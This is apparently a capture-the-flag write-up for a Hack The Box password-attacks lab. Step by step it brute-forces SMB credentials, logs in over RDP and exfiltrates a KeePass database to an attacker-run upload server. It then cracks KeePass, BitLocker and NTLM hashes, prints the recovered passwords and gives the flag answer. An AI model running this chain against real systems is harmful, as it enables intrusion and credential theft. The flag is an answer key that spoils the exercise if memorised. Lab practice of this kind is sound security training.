**QUESTION 1**: Examine the third target and submit the contents of flag.txt in C:\Users\Administrator\Desktop\ as the answer. 

Let's start with a nmap scan

```
sudo nmap -A -T4 <IP> -Pn
```

![](images/Password%20Attacks%20Lab%20-%20Hard/nmap.png)

We see that smb is running. We can try to use crackmapexec to brute force the password of the user johanna.

```
crackmapexec smb <IP> -u Johanna -p mut_password.list --shares
```

![](images/Password%20Attacks%20Lab%20-%20Hard/johanna_password.png)

We can the password: `1231234!`. We can use it to connect to the 'david' share

```
smbclient \\\\<IP>\\david -U johanna
```

![](images/Password%20Attacks%20Lab%20-%20Hard/david_share.png)

Unfortunately, we can't list the shared folder. But we saw earlier in the nmap scan that port 3389 is open. We can try to rdp with `johanna:123124!`

```
xfreerdp /u:johanna /p:1231234! /v:10.129.202.222 
```

![](images/Password%20Attacks%20Lab%20-%20Hard/rdp_johanna.png)

We are now logged in as johanna.
Looking around the filesystem, we can see a keepass database under `C:\Users\johanna\Documents`. Let's transfer it to our attack host and try to crack it. To do so we can set up a python uploadserver on our attack host and upload the file to the server with powershell.

But first we need to transfer [PSUpload.ps1](https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1) to the target and import it with `Import-Module .\PSUpload.ps1`

**Setting up the uploadserver**
``` bash linenums="1"
pip3 install uploadserver
python3 -m uploadserver
```

![](images/Password%20Attacks%20Lab%20-%20Hard/python3_uploadserver.png)

**Uploading the file with powershell**
``` powershell linenums="1"
Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File C:\Users\johanna\Documents
```

![](images/Password%20Attacks%20Lab%20-%20Hard/logins_kbdx_upload.png)

Now we should have the file in our attack host.
We can try to crack it with `keepass2john` and `john`

**keepass2john**
```
keepass2john Logins.kdbx > Logins.kdbx.hash
```

**john**
```
john --wordlist=mut_password.list Logins.kdbx.hash
```

![](images/Password%20Attacks%20Lab%20-%20Hard/logins_kdbx_cracked.png)

We can see the password is `Qwerty7!`. Let's use it to open the file.

![](images/Password%20Attacks%20Lab%20-%20Hard/david_password.png)

Now we have david's password: `gRzX7YbeTcDG7`. We can use it to connect to the shared folder.

```
smbclient \\\\<IP>\\david -U david
```

![](images/Password%20Attacks%20Lab%20-%20Hard/backup_vhd.png)

We can see a `Backup.vhd` file which is a BitLocker Encrypted Drive (more details in [Protected Archives module](https://academy.hackthebox.com/module/147/section/1323)). Let's download it and try to crack it.

> Trying to download the file throws the following error message: `parallel_read returned NT_STATUS_IO_TIMEOUT`. This is because the file is too big. Let's try to [mount the share instead](https://askubuntu.com/questions/1050460/how-to-mount-smb-share-on-ubuntu-18-04).


```
sudo mount -t cifs -o username=david //10.129.54.23/david ./david_share/
```

![](images/Password%20Attacks%20Lab%20-%20Hard/mount_david_share.png)

Now we can try to crack it.

``` linenums="1"
bitlocker2john -i Backup.vhd > Backup.vhd.hashes
grep "bitlocker\$0" Backup.vhd.hashes > Backup.vhd.hash
john --wordlist=mut_password.list Backup.vhd.hash
```

![](images/Password%20Attacks%20Lab%20-%20Hard/bitlocker2john.png)

![](images/Password%20Attacks%20Lab%20-%20Hard/bitlocker_password.png)

Password: `123456789!`

Now we need to transfer the Backup.vhd file to a windows vm and open it from there.

![](images/Password%20Attacks%20Lab%20-%20Hard/transfer_backupvhd_windows_vm.png)

Now we can mount it 

![](images/Password%20Attacks%20Lab%20-%20Hard/mount_backup_vhd.png)

Now under "This PC" you should see "Local Disk (E:)" which correspond to our drive. We can double-click it and enter the password

![](images/Password%20Attacks%20Lab%20-%20Hard/enter_password.png)

When we open the drive we can see 2 files: `SAM` and `SYSTEM`.
We can transfer them to our attack host and dump the hashes

**Transferring the files**

![](images/Password%20Attacks%20Lab%20-%20Hard/transfer_samsystem_to_kali.png)

**Dumping the hashes**

![](images/Password%20Attacks%20Lab%20-%20Hard/dumping_hashes.png)

We can now crack the admin password with hashcat

```
hashcat -m 1000 hash mut_password.list
```

![](images/Password%20Attacks%20Lab%20-%20Hard/admin_password.png)

The admin password is: `Liverp00l8!`. Now we can get the flag just by going to the Administrator's desktop `C:\Users\Administrator\Desktop\`

![](images/Password%20Attacks%20Lab%20-%20Hard/admin_flag.png)

Answer: **HTB{PWcr4ck1ngokokok}**